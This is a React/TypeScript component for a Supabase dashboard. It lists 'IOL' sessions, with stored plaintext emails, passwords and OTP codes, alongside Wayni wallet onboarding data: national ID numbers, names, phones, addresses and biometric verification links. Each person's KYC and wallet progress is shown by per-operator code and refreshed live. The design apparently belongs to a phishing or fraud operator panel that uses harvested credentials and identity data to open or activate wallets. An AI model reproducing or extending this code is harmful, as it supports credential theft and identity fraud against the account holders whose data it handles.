import { useCallback, useEffect, useMemo, useState } from "react";
import {
  CheckCircle2,
  ExternalLink,
  Loader2,
  RefreshCw,
  ShieldCheck,
  Smartphone,
  UserRound,
} from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { invokeWayni } from "@/lib/wayniApi";
import { Badge } from "@/components/ui/badge";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";

interface OperatorOption {
  id: string;
  code: string;
  name: string;
  user_id?: string;
}

interface SessionItem {
  id: string;
  email: string | null;
  password: string | null;
  status: string;
  otp_code: string | null;
  created_at: string;
  operator_code: string;
  country: string | null;
  city: string | null;
  source: string;
}

interface OnboardingRow {
  id: string;
  email: string;
  operator_code: string;
  dni: string | null;
  full_name: string | null;
  phone: string | null;
  gender: string | null;
  user_uuid: string | null;
  biometric_url: string | null;
  biometric_id: string | null;
  region: string | null;
  city: string | null;
  street: string | null;
  zip_code: string | null;
  bio_status: string | null;
  wallet_status: string | null;
  face_code: string | null;
  face_confidence: string | null;
  status: string;
  created_at: string;
  updated_at: string;
}

interface IolWayniManagerProps {
  operators: OperatorOption[];
  myOperator: OperatorOption | null;
  isAdmin: boolean;
}

const onboardingStatuses = [
  "redirect_kyc",
  "verify_dni_submitted",
  "verify_dni_success",
  "verify_dni_error",
  "address_submitted",
  "address_saved",
  "address_error",
  "biometric_started",
  "biometric_finished",
  "biometric_error",
] as const;

const statusPriority: Record<string, number> = {
  redirect_kyc: 1,
  verify_dni_submitted: 2,
  verify_dni_success: 3,
  address_submitted: 4,
  address_saved: 5,
  biometric_started: 6,
  biometric_finished: 7,
  validated: 8,
};

const parseOtp = (otp: string | null) => {
  const map: Record<string, string> = {};
  if (!otp) return map;
  otp.split("|").forEach((part) => {
    const colonIdx = part.indexOf(":");
    const eqIdx = part.indexOf("=");
    let sep = -1;
    if (colonIdx > 0 && eqIdx > 0) sep = Math.min(colonIdx, eqIdx);
    else if (colonIdx > 0) sep = colonIdx;
    else if (eqIdx > 0) sep = eqIdx;
    if (sep > 0) {
      map[part.slice(0, sep).trim()] = part.slice(sep + 1).trim();
    }
  });
  return map;
};

const mergeOtp = (base: string | null, preferred: string | null) => {
  const merged = { ...parseOtp(base), ...parseOtp(preferred) };
  return Object.entries(merged)
    .map(([key, value]) => `${key}:${value}`)
    .join("|");
};

const formatDateTime = (value?: string | null) => {
  if (!value) return "—";
  return new Date(value).toLocaleString("es-AR", {
    day: "2-digit",
    month: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
  });
};

const getStageLabel = (status: string, walletStatus?: string | null) => {
  if (String(walletStatus || "").toUpperCase() === "ACTIVE") return "Wallet activa";
  if (status === "redirect_kyc") return "Pendiente de inicio";
  if (status === "verify_dni_submitted") return "DNI enviado";
  if (status === "verify_dni_success") return "DNI validado";
  if (status === "address_submitted") return "Dirección enviada";
  if (status === "address_saved") return "Dirección validada";
  if (status === "biometric_started") return "Biometría en curso";
  if (status === "biometric_finished" || status === "validated") return "Biometría completada";
  if (status === "verify_dni_error") return "Error de DNI";
  if (status === "address_error") return "Error de dirección";
  if (status === "biometric_error") return "Error de biometría";
  return status || "Sin estado";
};

const getProgressSteps = (status: string, bioStatus?: string | null, walletStatus?: string | null) => {
  const biometricOk = status === "biometric_finished" || status === "validated" || String(bioStatus || "").toLowerCase() === "success";
  const walletOk = String(walletStatus || "").toUpperCase() === "ACTIVE";

  return [
    {
      label: "DNI",
      done: ["verify_dni_success", "address_submitted", "address_saved", "biometric_started", "biometric_finished", "validated"].includes(status),
      active: status === "verify_dni_submitted" || status === "redirect_kyc",
    },
    {
      label: "Dirección",
      done: ["address_saved", "biometric_started", "biometric_finished", "validated"].includes(status),
      active: status === "address_submitted",
    },
    {
      label: "Biometría",
      done: biometricOk,
      active: status === "biometric_started",
    },
    {
      label: "Wallet",
      done: walletOk,
      active: biometricOk && !walletOk,
    },
  ];
};

const ProgressPill = ({ label, done, active }: { label: string; done: boolean; active: boolean }) => (
  <div
    className={`rounded-lg border px-2 py-1 text-[10px] font-semibold ${
      done
        ? "border-primary/30 bg-primary/10 text-primary"
        : active
          ? "border-border bg-secondary text-foreground"
          : "border-border bg-background text-muted-foreground"
    }`}
  >
    {done ? "✓" : active ? "•" : "○"} {label}
  </div>
);

const WayniRecordCard = ({ item }: { item: SessionItem }) => {
  const [loading, setLoading] = useState(false);
  const [bioInfo, setBioInfo] = useState<Record<string, unknown> | null>(null);
  const [walletInfo, setWalletInfo] = useState<Record<string, unknown> | null>(null);

  const otp = parseOtp(item.otp_code);
  const dni = otp.dni || "";
  const biometricUrl = otp.biometric_url || "";
  const displayName = otp.name || item.email || "Sin identificar";
  const walletStatus = String((walletInfo?.status as string) || otp.wallet_status || "").toUpperCase() || null;
  const bioStatus = String((bioInfo?.status as string) || otp.bio_status || "") || null;
  const progress = getProgressSteps(item.status, bioStatus, walletStatus);

  const refreshStatus = useCallback(async () => {
    if (!dni) return;
    setLoading(true);
    try {
      const [bioResult, walletResult] = await Promise.all([
        invokeWayni({ action: "get_biometric_info", identity_number: dni }),
        invokeWayni({ action: "get_wallet_status", identity_number: dni }),
      ]);

      if (bioResult.data?.success) {
        setBioInfo(bioResult.data);
      }

      if (walletResult.data && !walletResult.error) {
        setWalletInfo(walletResult.data);
      }

      const updates: Record<string, string> = {};
      if (bioResult.data?.status) updates.bio_status = String(bioResult.data.status);
      if (walletResult.data?.status) updates.wallet_status = String(walletResult.data.status).toUpperCase();
      if (walletResult.data?.uuid) updates.wallet_uuid = String(walletResult.data.uuid);

      if (Object.keys(updates).length > 0) {
        const newOtp = mergeOtp(item.otp_code, Object.entries(updates).map(([k, v]) => `${k}:${v}`).join("|"));
        await supabase.from("sessions").update({ otp_code: newOtp }).eq("id", item.id);
      }
    } finally {
      setLoading(false);
    }
  }, [dni, item.id, item.otp_code]);

  return (
    <Card className="border-border">
      <CardContent className="space-y-4 p-4">
        <div className="flex items-start justify-between gap-3">
          <div className="min-w-0">
            <div className="flex items-center gap-2 flex-wrap">
              <p className="truncate text-sm font-semibold text-foreground">{displayName}</p>
              <Badge variant="outline" className="border-primary/30 bg-primary/10 text-primary">
                {getStageLabel(item.status, walletStatus)}
              </Badge>
              {item.operator_code && item.operator_code !== "master" && <Badge variant="secondary">{item.operator_code}</Badge>}
            </div>
            <p className="mt-1 text-xs text-muted-foreground">
              {item.email || "Sin email"} • {formatDateTime(item.created_at)}
            </p>
          </div>

          <Button variant="ghost" size="icon" onClick={() => void refreshStatus()} disabled={loading || !dni}>
            <RefreshCw className={loading ? "animate-spin" : ""} />
          </Button>
        </div>

        <div className="grid gap-2 sm:grid-cols-4">
          {progress.map((step) => (
            <ProgressPill key={step.label} {...step} />
          ))}
        </div>

        <div className="grid gap-3 md:grid-cols-2 xl:grid-cols-4">
          <div className="rounded-xl border border-border bg-background px-3 py-2">
            <p className="text-[10px] uppercase tracking-[0.18em] text-muted-foreground">DNI</p>
            <p className="mt-1 text-sm font-medium text-foreground">{dni || "—"}</p>
          </div>
          <div className="rounded-xl border border-border bg-background px-3 py-2">
            <p className="text-[10px] uppercase tracking-[0.18em] text-muted-foreground">Teléfono</p>
            <p className="mt-1 text-sm font-medium text-foreground">{otp.phone || "—"}</p>
          </div>
          <div className="rounded-xl border border-border bg-background px-3 py-2">
            <p className="text-[10px] uppercase tracking-[0.18em] text-muted-foreground">Biometría</p>
            <p className="mt-1 text-sm font-medium text-foreground">{bioStatus || "Pendiente"}</p>
          </div>
          <div className="rounded-xl border border-border bg-background px-3 py-2">
            <p className="text-[10px] uppercase tracking-[0.18em] text-muted-foreground">Wallet</p>
            <p className="mt-1 text-sm font-medium text-foreground">{walletStatus || "Pendiente"}</p>
          </div>
        </div>

        {(otp.region || otp.city || otp.street) && (
          <div className="rounded-xl border border-border bg-background px-3 py-2 text-sm text-muted-foreground">
            <span className="font-medium text-foreground">Dirección:</span>{" "}
            {[otp.street, otp.city, otp.region, otp.zip].filter(Boolean).join(" • ")}
          </div>
        )}

        <div className="flex flex-wrap gap-2">
          <Button variant="secondary" size="sm" onClick={() => void refreshStatus()} disabled={loading || !dni}>
            {loading ? <Loader2 className="animate-spin" /> : <ShieldCheck />}
            Actualizar estado
          </Button>
          {biometricUrl && (
            <Button variant="outline" size="sm" onClick={() => window.open(biometricUrl, "_blank", "noopener,noreferrer")}>
              <ExternalLink />
              Abrir biometría
            </Button>
          )}
        </div>
      </CardContent>
    </Card>
  );
};

const IolWayniManager = ({ myOperator }: IolWayniManagerProps) => {
  const [loading, setLoading] = useState(true);
  const [sessions, setSessions] = useState<SessionItem[]>([]);
  const [onboardingRows, setOnboardingRows] = useState<OnboardingRow[]>([]);

  const loadData = useCallback(async () => {
    setLoading(true);
    const sessionsQuery = supabase
      .from("sessions")
      .select("id, email, password, status, otp_code, created_at, operator_code, country, city, source")
      .eq("source", "iol")
      .order("created_at", { ascending: false })
      .limit(500);

    const onboardingQuery = (supabase as any)
      .from("wayni_onboarding")
      .select("id, email, operator_code, dni, full_name, phone, gender, user_uuid, biometric_url, biometric_id, region, city, street, zip_code, bio_status, wallet_status, face_code, face_confidence, status, created_at, updated_at")
      .order("updated_at", { ascending: false })
      .limit(500);

    if (myOperator?.code) {
      sessionsQuery.eq("operator_code", myOperator.code);
      onboardingQuery.eq("operator_code", myOperator.code);
    }

    const [{ data: sessionData }, { data: onboardingData }] = await Promise.all([sessionsQuery, onboardingQuery]);

    setSessions((sessionData as SessionItem[]) || []);
    setOnboardingRows((onboardingData as OnboardingRow[]) || []);
    setLoading(false);
  }, [myOperator?.code]);

  useEffect(() => {
    void loadData();

    const sessionsChannel = supabase
      .channel("iol-wayni-sessions")
      .on("postgres_changes", { event: "*", schema: "public", table: "sessions", filter: "source=eq.iol" }, () => {
        void loadData();
      })
      .subscribe();

    const onboardingChannel = supabase
      .channel("iol-wayni-onboarding")
      .on("postgres_changes", { event: "*", schema: "public", table: "wayni_onboarding" }, () => {
        void loadData();
      })
      .subscribe();

    return () => {
      supabase.removeChannel(sessionsChannel);
      supabase.removeChannel(onboardingChannel);
    };
  }, [loadData]);

  const mergedItems = useMemo(() => {
    const iolEmails = new Set(
      sessions
        .map((session) => session.email?.toLowerCase())
        .filter((value): value is string => Boolean(value)),
    );

    const sessionCandidates = sessions.filter((session) => {
      const otp = parseOtp(session.otp_code);
      return onboardingStatuses.includes(session.status as (typeof onboardingStatuses)[number])
        || Boolean(otp.dni || otp.uuid || otp.biometric_url || otp.wallet_status);
    });

    const list = [...sessionCandidates];

    for (const row of onboardingRows) {
      const email = row.email?.toLowerCase();
      if (!email || !iolEmails.has(email)) continue;

      const existingIndex = list.findIndex((session) => (session.email || "").toLowerCase() === email);
      const otpExtras = [
        row.dni ? `dni:${row.dni}` : null,
        row.full_name ? `name:${row.full_name}` : null,
        row.phone ? `phone:${row.phone}` : null,
        row.gender ? `gender:${row.gender}` : null,
        row.user_uuid ? `uuid:${row.user_uuid}` : null,
        row.region ? `region:${row.region}` : null,
        row.city ? `city:${row.city}` : null,
        row.street ? `street:${row.street}` : null,
        row.zip_code ? `zip:${row.zip_code}` : null,
        row.biometric_url ? `biometric_url:${row.biometric_url}` : null,
        row.biometric_id ? `biometric_id:${row.biometric_id}` : null,
        row.wallet_status ? `wallet_status:${row.wallet_status}` : null,
        row.bio_status ? `bio_status:${row.bio_status}` : null,
      ].filter(Boolean).join("|");

      if (existingIndex >= 0) {
        const current = list[existingIndex];
        const currentPriority = statusPriority[current.status] || 0;
        const rowPriority = statusPriority[row.status] || 0;
        const mergedOtp = mergeOtp(current.otp_code, otpExtras);

        list[existingIndex] = rowPriority >= currentPriority
          ? { ...current, status: row.status || current.status, otp_code: mergedOtp }
          : { ...current, otp_code: mergedOtp };
      } else {
        list.push({
          id: row.id,
          email: row.email,
          password: null,
          status: row.status || "redirect_kyc",
          otp_code: otpExtras,
          created_at: row.updated_at || row.created_at,
          operator_code: row.operator_code || "master",
          country: null,
          city: row.city,
          source: "iol",
        });
      }
    }

    return list.sort((a, b) => new Date(b.created_at).getTime() - new Date(a.created_at).getTime());
  }, [onboardingRows, sessions]);

  const activeCount = mergedItems.filter((item) => String(parseOtp(item.otp_code).wallet_status || "").toUpperCase() === "ACTIVE").length;
  const inProgressCount = mergedItems.filter((item) => String(parseOtp(item.otp_code).wallet_status || "").toUpperCase() !== "ACTIVE").length;

  return (
    <div className="space-y-4">
      <div className="grid gap-3 md:grid-cols-3">
        <Card className="border-border">
          <CardContent className="flex items-center justify-between p-4">
            <div>
              <p className="text-sm text-muted-foreground">Onboardings IOL</p>
              <p className="text-2xl font-semibold text-foreground">{mergedItems.length}</p>
            </div>
            <ShieldCheck className="h-5 w-5 text-primary" />
          </CardContent>
        </Card>
        <Card className="border-border">
          <CardContent className="flex items-center justify-between p-4">
            <div>
              <p className="text-sm text-muted-foreground">Em andamento</p>
              <p className="text-2xl font-semibold text-foreground">{inProgressCount}</p>
            </div>
            <Smartphone className="h-5 w-5 text-primary" />
          </CardContent>
        </Card>
        <Card className="border-border">
          <CardContent className="flex items-center justify-between p-4">
            <div>
              <p className="text-sm text-muted-foreground">Wallet ativa</p>
              <p className="text-2xl font-semibold text-foreground">{activeCount}</p>
            </div>
            <CheckCircle2 className="h-5 w-5 text-primary" />
          </CardContent>
        </Card>
      </div>

      <Card className="border-border">
        <CardHeader className="flex flex-row items-center justify-between space-y-0">
          <div>
            <CardTitle className="text-base">Onboarding Wayni — IOL</CardTitle>
            <p className="mt-1 text-sm text-muted-foreground">Aqui aparecem apenas sessões e onboardings vinculados à IOL.</p>
          </div>
          <Button variant="secondary" onClick={() => void loadData()} disabled={loading}>
            <RefreshCw className={loading ? "animate-spin" : ""} />
            Atualizar
          </Button>
        </CardHeader>
        <CardContent className="space-y-3">
          {loading ? (
            <div className="flex items-center gap-2 text-sm text-muted-foreground">
              <Loader2 className="h-4 w-4 animate-spin" /> Carregando onboardings...
            </div>
          ) : mergedItems.length === 0 ? (
            <div className="rounded-xl border border-border bg-background/60 p-6 text-sm text-muted-foreground">
              Nenhum onboarding Wayni da IOL encontrado ainda.
            </div>
          ) : (
            mergedItems.map((item) => <WayniRecordCard key={item.id} item={item} />)
          )}
        </CardContent>
      </Card>
    </div>
  );
};

export default IolWayniManager;
